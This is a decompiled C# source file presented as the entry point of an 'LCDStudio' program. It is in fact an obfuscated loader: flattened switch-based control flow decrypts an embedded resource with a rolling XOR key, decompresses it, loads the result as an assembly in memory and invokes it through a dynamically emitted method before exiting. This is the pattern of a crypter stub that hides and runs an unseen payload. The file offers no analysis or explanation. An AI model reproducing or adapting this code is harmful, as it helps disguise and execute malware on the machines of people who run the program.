using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Threading;
using LCDStudio.Properties;

namespace LCDStudio;

public class Program
{
	public delegate void GDelegate0(object sender, EventArgs e);

	public delegate object Matrix(Type TT);

	private static GDelegate0 gdelegate0_0;

	public static Matrix matrix_0;

	private static Type type_0;

	private static object object_0 = new object();

	[STAThread]
	public unsafe static void Main(string[] args)
	{
		void* ptr = stackalloc byte[8];
		object[] array = default(object[]);
		byte[] value = default(byte[]);
		while (true)
		{
			*(int*)ptr = Resources.Byte_0.Length;
			*(int*)((byte*)ptr + 4) = 1;
			while (true)
			{
				switch (*(int*)((byte*)ptr + 4))
				{
				case 8:
					Thread.Sleep(5400000);
					*(int*)((byte*)ptr + 4) = 5;
					continue;
				case 7:
					smethod_0(array, null);
					*(int*)((byte*)ptr + 4) = 6;
					continue;
				case 6:
					smethod_1(null);
					*(int*)((byte*)ptr + 4) = 8;
					continue;
				case 4:
					array[1] = *(int*)ptr;
					*(int*)((byte*)ptr + 4) = 7;
					continue;
				case 3:
					array = new object[2];
					*(int*)((byte*)ptr + 4) = 2;
					continue;
				case 2:
					array[0] = GCHandle.Alloc(value, GCHandleType.Pinned);
					*(int*)((byte*)ptr + 4) = 4;
					continue;
				default:
					gdelegate0_0 = smethod_0;
					value = smethod_2(Resources.Byte_0, 134, 136, ref *(int*)ptr);
					*(int*)((byte*)ptr + 4) = 3;
					continue;
				case 0:
					break;
				case 5:
					return;
				}
				break;
			}
		}
	}

	private unsafe static void smethod_0(object sender, EventArgs e)
	{
		void* ptr = stackalloc byte[8];
		byte* ptr2 = default(byte*);
		IntPtr intPtr = default(IntPtr);
		byte[] array2 = default(byte[]);
		while (true)
		{
			object[] array = (object[])sender;
			*(int*)((byte*)ptr + 4) = 4;
			while (true)
			{
				switch (*(int*)((byte*)ptr + 4))
				{
				case 6:
					ptr2 = (byte*)intPtr.ToPointer();
					*(int*)((byte*)ptr + 4) = 2;
					continue;
				case 5:
					*(int*)ptr = 0;
					*(int*)((byte*)ptr + 4) = 1;
					continue;
				case 4:
					intPtr = ((GCHandle)array[0]).AddrOfPinnedObject();
					*(int*)((byte*)ptr + 4) = 6;
					continue;
				case 2:
					array2 = new byte[(int)array[1]];
					*(int*)((byte*)ptr + 4) = 5;
					continue;
				default:
					while (*(int*)ptr < array2.Length)
					{
						array2[*(int*)ptr] = ptr2[*(int*)ptr];
						(*(int*)ptr)++;
					}
					*(int*)((byte*)ptr + 4) = 3;
					continue;
				case 0:
					break;
				case 3:
					type_0 = Assembly.Load(array2).GetExportedTypes()[0];
					return;
				}
				break;
			}
		}
	}

	private static void smethod_1(object object_1)
	{
		try
		{
		}
		catch
		{
		}
		lock (object_0)
		{
			DynamicMethod dynamicMethod = new DynamicMethod("LCD_", typeof(object), new Type[1] { typeof(Type) }, typeof(Program).Module);
			ILGenerator iLGenerator = dynamicMethod.GetILGenerator();
			iLGenerator.Emit(OpCodes.Ldarg_0);
			iLGenerator.EmitCall(OpCodes.Callvirt, typeof(Type).GetMethods()[50], null);
			iLGenerator.Emit(OpCodes.Ldc_I4_0);
			iLGenerator.Emit(OpCodes.Ldelem_Ref);
			iLGenerator.Emit(OpCodes.Ldnull);
			iLGenerator.Emit(OpCodes.Ldc_I4_0);
			iLGenerator.Emit(OpCodes.Newarr, typeof(object));
			iLGenerator.EmitCall(OpCodes.Callvirt, typeof(MethodBase).GetMethods()[13], null);
			iLGenerator.Emit(OpCodes.Ret);
			matrix_0 = (Matrix)dynamicMethod.CreateDelegate(typeof(Matrix));
			if (matrix_0 != null)
			{
				matrix_0(type_0);
			}
			Environment.Exit(0);
		}
	}

	private unsafe static byte[] smethod_2(byte[] byte_0, byte byte_1, byte byte_2, ref int int_0)
	{
		void* ptr = stackalloc byte[33];
		byte[] buffer = default(byte[]);
		while (true)
		{
			byte[] array = new byte[byte_0.Length];
			*(int*)((byte*)ptr + 28) = 7;
			while (true)
			{
				switch (*(int*)((byte*)ptr + 28))
				{
				case 7:
					Buffer.BlockCopy(byte_0, 0, array, 0, byte_0.Length);
					((byte*)ptr)[32] = byte_1;
					*(int*)((byte*)ptr + 28) = 6;
					continue;
				case 6:
					*(int*)((byte*)ptr + 16) = 0;
					*(int*)((byte*)ptr + 28) = 1;
					continue;
				case 5:
					((byte*)ptr)[32] = (byte)(((byte*)ptr)[32] * byte_2 % 256);
					*(int*)((byte*)ptr + 28) = 4;
					continue;
				case 4:
					(*(int*)((byte*)ptr + 16))++;
					*(int*)((byte*)ptr + 28) = 3;
					continue;
				case 3:
					if (*(int*)((byte*)ptr + 16) >= array.Length)
					{
						using MemoryStream memoryStream = new MemoryStream(array);
						while (true)
						{
							GClass0.GClass3 gClass = new GClass0.GClass3();
							byte[] array2 = new byte[5];
							*(int*)((byte*)ptr + 28) = 5;
							while (true)
							{
								switch (*(int*)((byte*)ptr + 28))
								{
								case 0:
									break;
								case 11:
									*(int*)((byte*)ptr + 24) = memoryStream.ReadByte();
									*(int*)((byte*)ptr + 28) = 6;
									continue;
								case 10:
									*(long*)ptr = 0L;
									*(int*)((byte*)ptr + 28) = 3;
									continue;
								case 9:
									gClass.method_5(array2);
									*(int*)((byte*)ptr + 28) = 10;
									continue;
								case 7:
									*(long*)ptr |= (long)((ulong)(byte)(*(int*)((byte*)ptr + 24)) << 8 * *(int*)((byte*)ptr + 20));
									*(int*)((byte*)ptr + 28) = 1;
									continue;
								case 6:
									if (*(int*)((byte*)ptr + 24) < 0)
									{
										throw new Exception();
									}
									goto case 7;
								case 5:
									memoryStream.Read(array2, 0, 5);
									*(int*)((byte*)ptr + 28) = 9;
									continue;
								case 4:
									if (*(int*)((byte*)ptr + 20) >= 8)
									{
										buffer = new byte[*(long*)ptr];
										*(int*)((byte*)ptr + 28) = 8;
										continue;
									}
									goto case 11;
								case 3:
									*(int*)((byte*)ptr + 20) = 0;
									*(int*)((byte*)ptr + 28) = 2;
									continue;
								case 2:
									*(int*)((byte*)ptr + 28) = 4;
									continue;
								default:
									(*(int*)((byte*)ptr + 20))++;
									*(int*)((byte*)ptr + 28) = 4;
									continue;
								case 8:
								{
									using MemoryStream memoryStream2 = new MemoryStream(buffer, writable: true);
									while (true)
									{
										*(long*)((byte*)ptr + 8) = memoryStream.Length - 13L;
										*(int*)((byte*)ptr + 28) = 2;
										while (true)
										{
											switch (*(int*)((byte*)ptr + 28))
											{
											case 0:
												break;
											case 2:
												goto IL_0219;
											default:
											{
												using BinaryReader binaryReader = new BinaryReader(memoryStream2);
												while (true)
												{
													array = binaryReader.ReadBytes(binaryReader.ReadInt32());
													*(int*)((byte*)ptr + 28) = 2;
													while (true)
													{
														switch (*(int*)((byte*)ptr + 28))
														{
														case 0:
															break;
														case 2:
															goto IL_0274;
														default:
															return array;
														}
														break;
														IL_0274:
														int_0 = array.Length;
														*(int*)((byte*)ptr + 28) = 1;
													}
												}
											}
											}
											break;
											IL_0219:
											gClass.method_4(memoryStream, memoryStream2, *(long*)((byte*)ptr + 8), *(long*)ptr);
											memoryStream2.Position = 0L;
											*(int*)((byte*)ptr + 28) = 1;
										}
									}
								}
								}
								break;
							}
						}
					}
					goto case 2;
				case 2:
					array[*(int*)((byte*)ptr + 16)] = (byte)(array[*(int*)((byte*)ptr + 16)] ^ ((byte*)ptr)[32]);
					*(int*)((byte*)ptr + 28) = 5;
					continue;
				default:
					*(int*)((byte*)ptr + 28) = 3;
					continue;
				case 0:
					break;
				}
				break;
			}
		}
	}
}
